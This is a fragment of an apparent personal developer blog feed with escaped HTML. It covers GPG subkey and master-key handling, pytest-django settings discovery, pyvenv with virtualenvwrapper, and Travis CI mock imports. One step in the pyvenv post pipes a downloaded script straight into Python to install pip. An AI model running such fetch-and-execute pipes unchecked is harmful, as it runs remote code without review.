Is&lt;span class="w"&gt; &lt;/span&gt;this&lt;span class="w"&gt; &lt;/span&gt;okay?&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;y/N&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# y &amp;lt;--&lt;/span&gt;

You&lt;span class="w"&gt; &lt;/span&gt;need&lt;span class="w"&gt; &lt;/span&gt;a&lt;span class="w"&gt; &lt;/span&gt;passphrase&lt;span class="w"&gt; &lt;/span&gt;to&lt;span class="w"&gt; &lt;/span&gt;unlock&lt;span class="w"&gt; &lt;/span&gt;the&lt;span class="w"&gt; &lt;/span&gt;secret&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;
user:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;name&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;&lt;span class="o"&gt;[&lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;email&lt;span class="w"&gt; &lt;/span&gt;address&lt;span class="o"&gt;]&lt;/span&gt;&amp;gt;
&lt;span class="m"&gt;4096&lt;/span&gt;-bit&lt;span class="w"&gt; &lt;/span&gt;RSA&lt;span class="w"&gt; &lt;/span&gt;key,&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;created&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17
&lt;span class="c1"&gt;# Enter passphrase &amp;lt;--&lt;/span&gt;

Revocation&lt;span class="w"&gt; &lt;/span&gt;certificate&lt;span class="w"&gt; &lt;/span&gt;created.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Make several copies of it and save it in a safe place (ideally not the same one as the master key!)&lt;/p&gt;
&lt;h2&gt;Remove the master key&lt;/h2&gt;
&lt;p&gt;Before proceeding, make sure to have backups of the &lt;code&gt;.gpg&lt;/code&gt; folder (perhaps on an encrypted media)&lt;/p&gt;
&lt;p&gt;Temporarily export the subkeys:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;--export-secret-subkeys&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;email&lt;span class="w"&gt; &lt;/span&gt;address&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;/media/encrypted-media/subkeys
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Delete the master key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;--delete-secret-key&lt;span class="w"&gt; &lt;/span&gt;0x6F87F32E2234961E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Re-import the subkeys and remove the temporary export:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;--import&lt;span class="w"&gt; &lt;/span&gt;/media/encrypted-usb/subkeys
$&lt;span class="w"&gt; &lt;/span&gt;shred&lt;span class="w"&gt; &lt;/span&gt;-u&lt;span class="w"&gt; &lt;/span&gt;/media/encrypted-usb/subkeys
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Check that everything worked as intended - the hash (#) next to the &lt;code&gt;sec&lt;/code&gt; line means that the master key is missing.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;-K&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;email&lt;span class="w"&gt; &lt;/span&gt;address&lt;span class="o"&gt;]&lt;/span&gt;

/home/username/.gnupg/secring.gpg
-----------------------------
sec#&lt;span class="w"&gt;  &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17
uid&lt;span class="w"&gt;                  &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;Your&lt;span class="w"&gt; &lt;/span&gt;name&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;&lt;span class="o"&gt;[&lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;email&lt;span class="w"&gt; &lt;/span&gt;address&lt;span class="o"&gt;]&lt;/span&gt;&amp;gt;
ssb&lt;span class="w"&gt;   &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Subkey&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17
ssb&lt;span class="w"&gt;   &lt;/span&gt;4096R/&lt;span class="o"&gt;[&lt;/span&gt;Subkey&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="m"&gt;2017&lt;/span&gt;-04-17
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Upload the key to a keyserver&lt;/h2&gt;
&lt;p&gt;Keyservers syncs keys with each other, so any keyserver would do.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;--keyserver&lt;span class="w"&gt; &lt;/span&gt;pgp.mit.edu&lt;span class="w"&gt; &lt;/span&gt;--send-key&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;your&lt;span class="w"&gt; &lt;/span&gt;key&lt;span class="w"&gt; &lt;/span&gt;ID&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Using your master key&lt;/h2&gt;
&lt;p&gt;Assuming that the &lt;code&gt;.gpg&lt;/code&gt; folder is on some kind of encrypted media:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;--homedir&lt;span class="o"&gt;=&lt;/span&gt;/media/encrypted-media/.gnupg/&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gpg&lt;span class="w"&gt; &lt;/span&gt;command&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Parting thoughts&lt;/h2&gt;
&lt;p&gt;That's it!&lt;/p&gt;
&lt;p&gt;There is probably a lot more to say, but this seems quite enough stuff to read already. Below there's a list of links that are worthed reading and/or served me as source of inspiration.&lt;/p&gt;
&lt;p&gt;Also, I am not an expert at this, so corrections to any mistake I might have made are more than welcome!&lt;/p&gt;
&lt;h3&gt;Resources&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://riseup.net/en/security/message-security/openpgp/best-practices"&gt;OpenPGP Best Practices&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gnupg.org/gph/en/manual/book1.html"&gt;The GNU Privacy handbook&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.debian.org/Subkeys?action=show&amp;amp;redirect=subkeys"&gt;Subkeys - Debian wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://debian-administration.org/users/dkg/weblog/48"&gt;HOWTO prep for migration off of SHA-1 in OpenPGP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.void.gr/kargig/blog/2013/12/02/creating-a-new-gpg-key-with-subkeys/"&gt;Creating a new GPG key with subkeys&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://alexcabal.com/creating-the-perfect-gpg-keypair/"&gt;Creating the perfect GPG keypair&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ekaia.org/blog/2009/05/10/creating-new-gpgkey/"&gt;Creating a new GPG key&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.clusterlabs.org/blog/2013/gpg-quickstart"&gt;GPG Quickstart&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://spin.atomicobject.com/2013/11/24/secure-gpg-keys-guide/"&gt;Generating More Secure GPG Keys: A Step-by-Step Guide&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="cryptography"></category><category term="GPG"></category><category term="cryptography"></category><category term="howto"></category></entry><entry><title>How to override pytest-django settings discovery order</title><link href="https://railslide.io/how-to-override-pytest-django-settings-discovery-order.html" rel="alternate"></link><published>2016-09-29T00:00:00+02:00</published><updated>2016-09-29T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2016-09-29:/how-to-override-pytest-django-settings-discovery-order.html</id><summary type="html">&lt;p&gt;The order pytest-django uses for determining which settings file should be used for running tests might not be the most optimal when using environment variables. However, it is still possible to override it so that it picks up the correct file without recurring to extra typing.&lt;/p&gt;</summary><content type="html">&lt;p&gt;If you want to use Pytest for running the test suite in your Django project, all you need to do is to install pytest-django, tell it where to look for the Django settings file - usually by placing a &lt;code&gt;pytest.ini&lt;/code&gt; file in the project root folder - and you're ready to go. However, even though the &lt;code&gt;pytest.ini&lt;/code&gt; file is probably the most common way to point pytest-django to the settings file, it also the last place in which pytest-django will look for it. In fact, every time you run &lt;code&gt;pytest&lt;/code&gt;, pytest-django will check for the &lt;code&gt;DJANGO_SETTINGS_MODULE&lt;/code&gt; variable in the following order:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;command line option with &lt;code&gt;--ds&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;environment variables&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pytest.ini&lt;/code&gt; file&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;While this order would work perfectly fine for many projects, if you happen to have an enviroment variable pointing to a different settings file (e.g. if you're running your project in a Docker container), it might reveals itself as a bit of a bummer. So, what are the available options for preventing django-pytest from picking up the wrong variable?&lt;/p&gt;
&lt;h2&gt;Using the &lt;code&gt;--ds&lt;/code&gt; option&lt;/h2&gt;
&lt;p&gt;This is probably a no-brainer, but the most obvious way to make sure pytest-django picks up the right settings file is to pass the &lt;code&gt;--ds&lt;/code&gt; option when invoking &lt;code&gt;pytest&lt;/code&gt; from the command line.&lt;/p&gt;
&lt;p&gt;While it certainly works, it adds quite a lot of typing - especially if you use a &lt;a href="https://www.rdegges.com/2011/the-perfect-django-settings-file/"&gt;settings module instead of a single setting file&lt;/a&gt;, since it could easily translate into&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;pytest&lt;span class="w"&gt; &lt;/span&gt;--ds&lt;span class="o"&gt;=&lt;/span&gt;project_folder.settings_folder.settings_file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Certainly not something I'd like to do every time I want to run the test suite.&lt;/p&gt;
&lt;h2&gt;Setting the environment variable&lt;/h2&gt;
&lt;p&gt;Another way around the issue is to set the environment variable to the test settings file before every test run and the setting it back to its original value once you're finished.&lt;/p&gt;
&lt;p&gt;However, besides still requiring quite a lot of typing, this method is also extremely error prone. What if you forget to set the environment variable back after test running? So, unless you're willing to take the risk of frustrating debugging time trying to figure out why your app is not working as it should, this option is pretty much a no-op.&lt;/p&gt;
&lt;h2&gt;Using &lt;code&gt;addopts&lt;/code&gt; in the &lt;code&gt;pytest.ini&lt;/code&gt; file&lt;/h2&gt;
&lt;p&gt;Wouldn't be awesome if you could just use the &lt;code&gt;pytest.ini&lt;/code&gt; file, set all the necessary settings in there, and not have to worry ever again? Actually you can, thanks to &lt;a href="http://doc.pytest.org/en/3.0.2/customize.html#confval-addopts"&gt;&lt;code&gt;addopts&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;What &lt;code&gt;addopts&lt;/code&gt; does is to add options (hence the double d!) to your test run as if they were specified via command line. So, for example, if you want to update and export coverage every time you run the suite, you would write this in the &lt;code&gt;pytest.ini&lt;/code&gt; file&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;[pytest]&lt;/span&gt;
&lt;span class="na"&gt;addopts&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;--cov&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;.&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="na"&gt;--cov-report&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;html&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;and every time you run &lt;code&gt;pytest&lt;/code&gt; it will, behind the scene, be interpreted as if you have run&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;pytest&lt;span class="w"&gt; &lt;/span&gt;--cov&lt;span class="o"&gt;=&lt;/span&gt;.&lt;span class="w"&gt; &lt;/span&gt;--cov-report&lt;span class="o"&gt;=&lt;/span&gt;html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Thus, by adding &lt;code&gt;--ds=project_folder.settings_folder.settings_file&lt;/code&gt; to &lt;code&gt;addopts&lt;/code&gt; it is possible to override pytest-django discovery order and make sure that the value in the &lt;code&gt;pytest.ini&lt;/code&gt; file gets read instead of environment variable.&lt;/p&gt;
&lt;p&gt;Ok, but what if you want to point pytest to a different settings file for one run only? No problem! One of the perks of this method is that you can esplicitly pass the &lt;code&gt;--ds&lt;/code&gt; option from the command line to override the one in the &lt;code&gt;pytest.ini&lt;/code&gt; file. So running&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;pytest&lt;span class="w"&gt; &lt;/span&gt;--ds&lt;span class="o"&gt;=&lt;/span&gt;other_settings_file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;will just work as usual. Neat!&lt;/p&gt;</content><category term="dev"></category><category term="django"></category><category term="pytest"></category><category term="pytest-django"></category><category term="environment variables"></category></entry><entry><title>Using pyvenv with virtualenvwrapper</title><link href="https://railslide.io/pyvenv-virtualenvwrapper.html" rel="alternate"></link><published>2016-06-07T00:00:00+02:00</published><updated>2016-06-07T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2016-06-07:/pyvenv-virtualenvwrapper.html</id><summary type="html">&lt;p&gt;After reading that it might be possible to use virtualenvwrapper with pyvenv, I decided to fire up a couple of virtual machines and to find it out.&lt;/p&gt;</summary><content type="html">&lt;p&gt;Python 3 ships with pyvenv, a built-in virtualenv manager. Although I welcomed the news as a definitely good one, the absence of a virtualenvwrapper-like tool for pyvenv has always stopped me from giving it a try. I consider virtualenvwrapper to be a super neat tool (I even wrote a plugin for it!) and I don't see why I would want to type the path to my virtual environment activation script every time I want to activate it, when I can just use a way more pythonic &lt;code&gt;workon my_venv&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I happened, however, to stumble into &lt;a href="https://groups.google.com/forum/#!msg/virtualenvwrapper/bkpwkfyIppM/9M9mz3pB0RQJ"&gt;a conversation&lt;/a&gt; in the virtualenvwrapper google group, where Doug Hellman (aka the guy behind virtualenvwrapper) wrote that &lt;em&gt;in theory&lt;/em&gt; it should be possible to use virtualenvwrapper with pyvenv. So I immediately fired up a couple of virtual machines and started playing around in order to see whether it was possible to turn that &lt;em&gt;in theory&lt;/em&gt; into an &lt;em&gt;in practice&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;The Ubuntu mess&lt;/h2&gt;
&lt;p&gt;According to Python documentation I should be able to invoke pyvenv by simply calling &lt;code&gt;pyvenv [args]&lt;/code&gt;. However, that is not the case for Ubuntu. Thus, my first attempt to set my &lt;code&gt;VIRTUALENVWRAPPER_VIRTUALENV&lt;/code&gt; variable equal to &lt;code&gt;pyvenv&lt;/code&gt; resulted in my vagrant machine complaining because it could not find it in my path. Setting it to &lt;code&gt;pyvenv-3.4&lt;/code&gt; solved it (I was initially testing on Ubuntu 14.04, which ships with Python 3.4). Though having to manually change it whenever I decide to update my Python version is far from optimal.&lt;/p&gt;
&lt;p&gt;So I set &lt;code&gt;pyvenv-3.4&lt;/code&gt; as &lt;code&gt;VIRTUALENVWRAPPER_VIRTUALENV&lt;/code&gt;, created a new virtualenv and...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Error:&lt;span class="w"&gt; &lt;/span&gt;Command&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[&amp;#39;&lt;/span&gt;/home/vagrant/.virtualenvs/test/bin/python3.4&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;-Im&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;ensurepip&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;--upgrade&lt;span class="s1"&gt;&amp;#39;, &amp;#39;&lt;/span&gt;--default-pip&lt;span class="s1"&gt;&amp;#39;]&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;returned&lt;span class="w"&gt; &lt;/span&gt;non-zero&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;status&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Ok, not exactly what I was hoping for.&lt;/p&gt;
&lt;p&gt;After a bit of digging, it came out that it is due &lt;a href="https://bugs.launchpad.net/ubuntu/+source/python3.4/+bug/1290847"&gt;to a bug with ensurepip&lt;/a&gt; in the first release of Ubuntu 14.04. However, it is possible to bypass the problem by first creating the virtualenv without pip and then manually installing it once inside it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;mkvirtualenv&lt;span class="w"&gt; &lt;/span&gt;--without-pip&lt;span class="w"&gt; &lt;/span&gt;my_venv
&lt;span class="o"&gt;(&lt;/span&gt;my_venv&lt;span class="o"&gt;)&lt;/span&gt;$&lt;span class="w"&gt; &lt;/span&gt;curl&lt;span class="w"&gt; &lt;/span&gt;https://bootstrap.pypa.io/get-pip.py&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;python
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Quite a lot to type, plus you have to wait for Pip to install. Definitely not optimal.&lt;/p&gt;
&lt;p&gt;Fortunately the issue has been solved in Ubuntu 14.04.2 (which allowed me to perform my tests), but for some reason the whole pyvenv package has been &lt;a href="http://askubuntu.com/questions/682612/pyvenv-3-4-disappeared-in-ubuntu-14-04-3"&gt;removed in Ubuntu 14.04.03&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Ok, not exactly an encouraging scenario... but hey! Ubuntu 16.04 has been released in the meanwhile and it ships with Python 3.5! Maybe things have changed in the new LTS? Well, apparently not, since getting an image with a working pyvenv package looks pretty much like a lottery: you pick one and hope for the best.&lt;/p&gt;
&lt;p&gt;The vagrant box &lt;code&gt;20160521.0.0&lt;/code&gt; shipped with a working pyvenv, but then it disappeared from the catalog. The &lt;code&gt;20160528.0.0&lt;/code&gt; one brings back to the good old ensurepip bug, while in the &lt;code&gt;20160606.1.0&lt;/code&gt; pyvenv seems to work again. For the sake honesty, it might be a problem related to the vagrant boxes only, since this wasn't the &lt;a href="https://github.com/mitchellh/vagrant/issues/7288"&gt;only&lt;/a&gt; &lt;a href="https://groups.google.com/d/msg/vagrant-up/cUXVwSDi4vc/OhyXR-G7CAAJ"&gt;issue&lt;/a&gt; I encountered. But at this point I already started to wonder whether the pyvenv package will be ever stable enough to be used in everyday development.&lt;/p&gt;
&lt;p&gt;The only good news is that in 16.04 the package can also be installed and invoked through a more generic alias (&lt;code&gt;python3-venv&lt;/code&gt; for installing and &lt;code&gt;pyvenv&lt;/code&gt; for invoking), so that - if it will ever become stable - you will have no longer to worry about manually updating your pyvenv version in your shell start file.&lt;/p&gt;
&lt;h2&gt;What doesn't work when it works&lt;/h2&gt;
&lt;p&gt;Leaving Ubuntu peculiarities apart, the initial question remains: assuming a working pyvenv package, is it possible to use it as a replacement for virtualenv in virtualenwrapper?&lt;/p&gt;
&lt;p&gt;The answer is yes, but with some gotchas.&lt;/p&gt;
&lt;p&gt;All the site packages related commands, i.e&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;lssitepackages&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;toogleglobalsitepackages&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cdsitepackages&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;add2virtualenv&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;don't work and they all raise&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ne"&gt;AttributeError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt; &lt;span class="nb"&gt;object&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;no&lt;/span&gt; &lt;span class="n"&gt;attribute&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;sysconfig&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code&gt;cpvirtualenv&lt;/code&gt; is instead a bit weird, since it does copy the virtualenv, but it displays the name of the original one in front of the prompt of all its copies. Even making copies of a copy doesn't change the result: it still shows the name of the first original. The &lt;code&gt;$VIRTUAL_ENV&lt;/code&gt; variable and the interpreter point to the correct folder tho...&lt;/p&gt;
&lt;p&gt;Last but not least, is probably worthy mentioning that - by design - pyvenv doesn't offer the possibility to specify a Python interpreter for virtual environments, so&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;mkvirtualenv&lt;span class="w"&gt; &lt;/span&gt;-p&lt;span class="w"&gt; &lt;/span&gt;/path/to/python/interpreter&lt;span class="w"&gt; &lt;/span&gt;my_venv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;no longer works, which means no way to get a Python 2.7 virtualenv out of it.&lt;/p&gt;
&lt;p&gt;All the rest work as expected.&lt;/p&gt;
&lt;h2&gt;Summing up&lt;/h2&gt;
&lt;p&gt;Before I started experiment with it, I was seriously tinkering with the idea of dropping virtualenv altogether and use pyvenv instead. However, after seeing the results, it looks like it's not going to be the case. Not much for the site packages commands - I think this was the first time I ever used them - but rather for the impossibility to switch to Python 2.7 when needed.&lt;/p&gt;
&lt;p&gt;Also, the whole Ubuntu situation is quite a show-stopper for me, since I don't really want to rely on hoping that everything still works every time I run an &lt;code&gt;apt update&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;So, at the current status, replacing virtualenv with pyvenv is definitely a no-op for me. However, if you want to give it a try, I uploaded the Vagrantfiles for the virtual machines in a &lt;a href="https://github.com/Railslide/pyvenvwrapper"&gt;GitHub repo&lt;/a&gt;. They're provisioned with a shell script, so that there's no need to install any fancy tool for running them. Feel free to play with them and don't forget to give me a shout if you find a way to fix those issues!&lt;/p&gt;</content><category term="dev"></category><category term="virtualenvwrapper"></category><category term="virtualenv"></category><category term="python3"></category><category term="pyvenv"></category></entry><entry><title>Travis, Mock, different Python versions, and an afternoon of frustration</title><link href="https://railslide.io/travis-mock-afternoon-of-frustration.html" rel="alternate"></link><published>2016-05-15T00:00:00+02:00</published><updated>2016-05-15T00:00:00+02:00</updated><author><name>Giulia</name></author><id>tag:railslide.io,2016-05-15:/travis-mock-afternoon-of-frustration.html</id><summary type="html">&lt;p&gt;My plan was to quickly set up Travis CI for Subvenv and then move on to other projects. Instead, it came out that I couldn't have been more wrong and I ended up instead in an afternoon of frustration.&lt;/p&gt;</summary><content type="html">&lt;p&gt;I have been tinkering for a while with the idea of setting up Travis CI for Subvenv. I mean, automatically running tests on pull requests sounded like a great idea and the getting started guide seemed pretty straightforward, so why not use a bit of my today's free-for-coding time for setting Travis up?&lt;/p&gt;
&lt;p&gt;Armed with enthusiasm, I set up the &lt;code&gt;.travis.yml&lt;/code&gt; configuration file, granted the necessary GitHub permissions, enabled Travis for Subvenv, pushed, and... build failure!&lt;/p&gt;
&lt;h2&gt;There's always a first time (for a failure)&lt;/h2&gt;
&lt;p&gt;Ok, you know the old adage: &lt;em&gt;if it compiles the first time, there must be something wrong&lt;/em&gt;. And in a similar fashion, this first failure didn't come at all as a surprise. Not a big deal. Also, the build for Python 3.4 succeeded, which is good.&lt;/p&gt;
&lt;p&gt;I checked out the error messages and - of course - it complains because it couldn't find the &lt;code&gt;unittest.mock&lt;/code&gt; module in Python 2. Since I'd rather not add dependencies that are not strictly necessary for setting up the development environment, I was quite happy to read that Travis CI automatically installs mock in its testing environments. So, I wrapped my import statement in a try-except block as such:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;unittest.mock&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mock_open&lt;/span&gt;
&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;ImportError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;mock&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mock_open&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;To be honest, I am not super glad about an import that relies on a non-mandatory dependency, but let's play along for now and let's get Travis up and running - I can always come up with something better on a later moment.&lt;/p&gt;
&lt;p&gt;Ok so, commit my hack, push, and hold my breath for a handful of seconds. Does it work? Nope.&lt;/p&gt;
&lt;h2&gt;Builtins, __builtin__, and better mocking decisions&lt;/h2&gt;
&lt;p&gt;Since Subvenv relies on I/O operations for doing its job, I made sure to mock them away when writing my tests. However, since I use Python 3 as my default, I had initially mocked the &lt;code&gt;open&lt;/code&gt; function like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;builtins.open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

